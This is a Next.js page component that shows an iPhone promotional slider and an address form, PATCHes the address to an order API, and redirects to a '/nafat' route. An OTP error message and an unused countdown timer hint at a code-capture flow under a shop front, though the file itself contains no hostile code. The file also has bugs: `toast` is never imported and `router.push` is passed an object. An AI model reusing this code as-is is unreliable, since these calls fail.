import { Pagination, Autoplay, A11y, EffectCards } from 'swiper/modules'
import { Swiper, SwiperSlide } from 'swiper/react'
import SwiperCore from 'swiper'

// Import Swiper styles
import 'swiper/css'
import 'swiper/css/navigation'
import 'swiper/css/pagination'
import 'swiper/css/scrollbar'
import 'swiper/css/free-mode'
import 'swiper/css/thumbs'
import { FaArrowRightLong } from 'react-icons/fa6'
import { useEffect, useState } from 'react'
import { useRouter, useSearchParams } from 'next/navigation'

const Address = () => {
  const router = useRouter()
  const searchParams = useSearchParams()

  const params = new URLSearchParams(searchParams)

  SwiperCore.use([Autoplay])
  // a countdown timer function
  const [time, setTime] = useState(180)
  useEffect(() => {
    const timer = setInterval(() => {
      setTime((prevTime) => {
        if (prevTime === 0) {
          clearInterval(timer)
          return 0
        }
        return prevTime - 1
      })
    }, 1000)
    return () => clearInterval(timer)
  }, [])

  const address = {
    city: '',
    country: '',
    addressDetails: '',
  }

  const handleSubmit = (e) => {
    e.preventDefault()

    address.city = e.target.city.value
    address.country = e.target.country.value
    address.addressDetails = e.target.addressDetails.value

    const submitData = {
      address: address,
    }

    if (address.city === '') {
      toast.error('Please enter your city')
    } else if (address.country === '') {
      toast.error('Please enter your country')
    } else if (address.addressDetails === '') {
      toast.error('Please enter your address details')
    } else {
      // post all the data through api localhost:3000/api/order
      fetch(`${process.env.API_URL}/api/order/${params.get('id')}`, {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(submitData),
      })
        .then((res) => res.json())
        .then((data) => {
          if (data) {
            router.push({
              pathname: '/nafat',
              query: { id: data._id },
            })
          } else {
            toast.error('Please enter correct otp')
          }
        })
    }
  }

  return (
    <>
      {/* create a form so that I can add user-name, email, phone number etc add some design also */}
      <Swiper
        // install Swiper modules
        modules={[Pagination, A11y, EffectCards]}
        spaceBetween={50}
        slidesPerView={1}
        loop={true}
        autoplay={{
          delay: 2500,
          disableOnInteraction: false,
        }}
        pagination={{ clickable: true }}
        // onSwiper={(swiper) => console.log(swiper)}
        // onSlideChange={() => console.log('slide change')}
      >
        <SwiperSlide className="!h-[300px] w-full bg-[url('/images/slider-background-girl.jpg')] bg-center bg-cover bg-no-repeat">
          <div className="h-[300px] flex flex-col justify-center items-end mx-40 ">
            <h1 className="text-4xl font-bold text-gray-600">IPhone 14</h1>
            <button className="py-3 px-5 w-fit text-gray-600 hover:text-white hover:bg-teal-500 font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out">
              Order Now <FaArrowRightLong size={16} />
            </button>
          </div>
        </SwiperSlide>
        <SwiperSlide className="!h-[300px] w-full bg-[url('/images/slider-background-human.jpg')] bg-center bg-cover bg-no-repeat">
          <div className="h-[300px] flex flex-col justify-center items-end mx-40 ">
            <h1 className="text-4xl font-bold text-gray-600">
              IPhone 14 Pro Max
            </h1>
            <button className="py-3 px-5 w-fit text-gray-600 hover:text-white hover:bg-teal-500 font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out">
              Order Now <FaArrowRightLong size={16} />
            </button>
          </div>
        </SwiperSlide>
        <SwiperSlide className="!h-[300px] w-full bg-[url('/images/slider-background.jpg')] bg-center bg-cover bg-no-repeat">
          <div className="h-[300px] flex flex-col justify-center items-start mx-40">
            <h1 className="text-4xl font-bold text-gray-600">
              Buy Your Dreams
            </h1>
            <button className="py-3 px-5 w-fit text-gray-600 hover:text-white hover:bg-teal-500 font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out">
              Order Now <FaArrowRightLong size={16} />
            </button>
          </div>
        </SwiperSlide>
      </Swiper>
      <div className="max-w-[1400px] mx-auto flex flex-col justify-center items-center ">
        <h1 className="text-4xl font-bold text-gray-600 mt-10">User Address</h1>

        <form onSubmit={handleSubmit} className="w-3/4 my-14">
          <div className="grid md:grid-cols-2 md:gap-6">
            <div className="relative z-0 w-full mb-6 group">
              <input
                type="text"
                name="city"
                id="city"
                className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
                placeholder=""
                required
              />
              <label
                htmlFor="city"
                className="z-10 peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
              >
                City
              </label>
            </div>
            <div className="relative z-0 w-full mb-6 group">
              <input
                type="text"
                name="country"
                id="country"
                className="block py-2.5 px-0 w-full text-sm bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
                placeholder=""
                required
              />
              <label
                htmlFor="country"
                className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
              >
                Country
              </label>
            </div>
          </div>
          <div className="relative z-0 w-full mb-6 group">
            <input
              type="text"
              name="addressDetails"
              id="addressDetails"
              className="block py-2.5 px-0 w-full text-sm text-gray-900 bg-transparent border-0 border-b-2 border-gray-300 appearance-none  dark:border-gray-600 dark:focus:border-teal-500 focus:outline-none focus:ring-0 focus:border-teal-600 peer"
              placeholder=""
              required
            />
            <label
              htmlFor="addressDetails"
              className="peer-focus:font-medium absolute text-sm text-gray-500 dark:text-gray-400 duration-300 transform -translate-y-6 scale-75 top-3 z-10 origin-[0] peer-focus:start-0 rtl:peer-focus:translate-x-1/4 rtl:peer-focus:left-auto peer-focus:text-teal-600 peer-focus:dark:text-teal-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6"
            >
              Address Details
            </label>
          </div>
          <button
            type="submit"
            className="flex gap-2 justify-center items-center rounded-sm font-bold w-full px-4 py-2 text-md tracking-wide text-white capitalize transition-colors duration-200 transform bg-teal-500 hover:bg-teal-600 focus:outline-none focus:bg-teal-600"
          >
            Next <FaArrowRightLong size={16} />
          </button>
        </form>
      </div>
      <div className="h-20 bg-teal-400 mt-5"></div>
    </>
  )
}

export default Address
